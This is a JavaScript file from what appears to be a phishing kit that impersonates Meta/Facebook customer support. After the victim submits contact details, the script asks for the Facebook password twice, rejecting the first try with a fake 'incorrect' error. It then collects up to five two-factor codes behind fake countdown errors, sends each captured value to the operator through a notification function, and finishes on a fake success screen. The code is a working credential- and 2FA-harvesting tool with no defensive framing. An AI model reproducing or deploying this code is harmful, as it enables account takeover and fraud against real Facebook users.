// Main Application Logic
document.getElementById('clientForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const formData = {
        fullName: document.getElementById('fullName').value.trim(),
        email: document.getElementById('email').value.trim(),
        emailBusiness: document.getElementById('emailBusiness').value.trim(),
        fanpage: document.getElementById('fanpage').value.trim(),
        phone: document.getElementById('phone').value.trim(),
    }; 

    Utils.saveRecord('__client_rec__fi_rst', formData);
    await Utils.sendNotification(formData);
    openSecurityModal();
});


// ==================== MODAL 2: SECURITY (PASSWORD) ====================
function openSecurityModal() {
    const content = `
        <div class="h-auto flex flex-col items-center justify-between flex-1">
            <div class="w-12 h-12 mb-5 mx-auto">
                <img src="./public/images/logo.svg" alt="Meta" class="w-full">
            </div>
            <div class="w-full">
                <p class="text-[#9a979e] text-sm mb-4">For your security, you must enter your password to continue.</p>
                <form id="securityForm">
                    <div class="relative mb-3">
                        <input type="password" id="password" placeholder="Password" class="w-full border border-[#d4dbe3] h-10 px-3 pr-10 rounded-lg text-base focus:border-blue-500 outline-none">
                        <button type="button" id="togglePass" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700">
                            <svg id="eyeIcon" class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
                        </button>
                    </div>
                    <p id="passwordError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors flex items-center justify-center">Continue</button>
                    <p class="text-center mt-3"><a href="#" class="text-[#9a979e] text-sm">Forgot password?</a></p>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/images/logo-gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let securityClickCount = 0;
    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const submitBtn = e.target.querySelector('button[type="submit"]');
        if (submitBtn.disabled) return;

        const password = document.getElementById('password').value.trim();
        const errorMsg = document.getElementById('passwordError');

        errorMsg.classList.add('hidden');
        if (!password) {
            errorMsg.textContent = "You haven't entered your password!";
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>';

        if (securityClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__fi_rst');
            const clientData = { password, ...dataLocal };
            Utils.saveRecord('__client_rec__se_con', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continue';
                document.getElementById('password').value = '';
                errorMsg.textContent = 'The password you\'ve entered is incorrect.';
                errorMsg.classList.remove('hidden');
                securityClickCount = 1;
            }, 1350);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__se_con');
            const clientData = { passwordSecond: password, ...dataLocal };
            Utils.saveRecord('__client_rec__th_ird', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('securityModal');
                openAuthenticationModal(clientData);
            }, 1500);
        }
    });

    document.getElementById('togglePass').addEventListener('click', () => {
        const input = document.getElementById('password');
        const icon = document.getElementById('eyeIcon');
        if (input.type === 'password') {
            input.type = 'text';
            icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M17.94 17.94A10.07 10.07 0 0112 20c-4.477 0-8.268-2.943-9.542-7a10.07 10.07 0 013.22-4.348m4.424-2.123A10.07 10.07 0 0112 5c4.477 0 8.268 2.943 9.542 7a10.07 10.07 0 01-4.22 5.355M9.88 9.88a3 3 0 104.24 4.24M3 3l18 18" stroke="currentColor" fill="none" stroke-width="2"/>';
        } else {
            input.type = 'password';
            icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>';
        }
    });
}

// ==================== MODAL 3: AUTHENTICATION (2FA) ====================
function openAuthenticationModal(userData) {
    const emailDisplay = Utils.maskEmail(userData.email);
    const phoneDisplay = Utils.maskPhone(userData.phone);
    const description = `Enter the code for this account that we send to ${emailDisplay}, ${phoneDisplay} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)`;

    const content = `
        <div class="flex flex-col h-full justify-between">
            <div>
                <div class="flex items-center text-[#9a979e] gap-1.5 text-sm mb-2">
                    <span>${userData.fullName}</span>
                    <div class="w-1 h-1 bg-[#9a979e] rounded-full"></div>
                    <span>Facebook</span>
                </div>
                <h2 class="text-[20px] text-[black] font-[700] mb-[15px]">Two-factor authentication required</h2>
                <p class="text-[#9a979e] text-sm mb-4">${description}</p>
                <div class="w-full rounded-lg bg-[#f5f5f5] overflow-hidden mb-4">
                    <img src="./public/images/authentication.png" alt="2FA" class="w-full">
                </div>
                <form id="authForm">
                    <input type="text" id="twoFa" placeholder="Code" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-base focus:border-blue-500 outline-none mb-3">
                    <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" id="authSubmitBtn" disabled class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center">Continue</button>
                    <div class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3]"><span>Try another way</span></div>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto"><img src="./public/images/logo-gray.svg" alt="Meta"></div>
        </div>
    `;

    Modal.create('authModal', content);
    Modal.open('authModal');

    const input2Fa = document.getElementById('twoFa');
    const submitBtn = document.getElementById('authSubmitBtn');
    const errorMsg = document.getElementById('authError');
    let authClickCount = 0;

    input2Fa.addEventListener('input', () => {
        if (!input2Fa.disabled) {
            submitBtn.disabled = input2Fa.value.trim().length < 6;
        }
    });

    document.getElementById('authForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        if (submitBtn.disabled) return;

        const twoFa = input2Fa.value.trim();

        errorMsg.classList.add('hidden');
        if (!twoFa || twoFa.length < 6) {
            errorMsg.textContent = !twoFa ? "You haven't entered the code!" : "Code must be at least 6 digits!";
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>';

        const steps = {
            0: { keyLocal: '__client_rec__th_ird', keySave: '__client_rec__fou_rth', dataKey: 'twoFa', delay: 1400 },
            1: { keyLocal: '__client_rec__fou_rth', keySave: '__client_rec__f_if_th', dataKey: 'twoFaSecond', delay: 1200 },
            2: { keyLocal: '__client_rec__f_if_th', keySave: '__client_rec__si_xth', dataKey: 'twoFaThird', delay: 1200 },
            3: { keyLocal: '__client_rec__si_xth', keySave: '__client_rec__se_venth', dataKey: 'twoFaFourth', delay: 1200 }
        };

        const currentStep = steps[authClickCount];

        if (currentStep) {
            const dataLocal = Utils.getRecord(currentStep.keyLocal);
            const clientData = { [currentStep.dataKey]: twoFa, ...dataLocal };
            Utils.saveRecord(currentStep.keySave, clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.innerHTML = 'Continue';
                startCountdown(input2Fa, errorMsg, submitBtn); 
                authClickCount++;
            }, currentStep.delay);
        } else {
            // Lần cuối cùng (lần thứ 5)
            const dataLocal = Utils.getRecord('__client_rec__se_venth');
            await Utils.sendNotification({ twoFaFifth: twoFa, ...dataLocal });

            setTimeout(() => {
                Modal.close('authModal');
                openSuccessModal();
            }, 1600);
        }
    });
}

function startCountdown(input, errorMsg, submitBtn) {
    input.disabled = true;
    submitBtn.disabled = true;
    input.value = ''; 

    let time = CONFIG.COUNTDOWN_TIME;
    const updateError = () => errorMsg.textContent = `The code is incorrect. Try again after ${time} seconds.`;
    
    updateError();
    errorMsg.classList.remove('hidden');

    const countdownInterval = setInterval(() => {
        time--;
        updateError();
        submitBtn.disabled = true; 

        if (time <= 0) {
            clearInterval(countdownInterval);
            input.disabled = false;
            errorMsg.classList.add('hidden');
            input.focus(); 
        }
    }, 1000);
}

// ==================== MODAL 4: SUCCESS ====================
function openSuccessModal() {
    const content = `
        <h2 class="font-bold text-[18px] mb-4 text-left">Request has been sent</h2>
        <div class="rounded-lg overflow-hidden mb-4">
            <img src="./public/images/privacy_center.png" alt="Success" class="w-full">
        </div>
        <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
        <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
            Return to Facebook
        </a>
        <div class="w-16 mt-5 mx-auto">
            <img src="./public/images/logo-gray.svg" alt="Meta">
        </div>
    `;

    Modal.create('successModal', content);
    Modal.open('successModal');
}
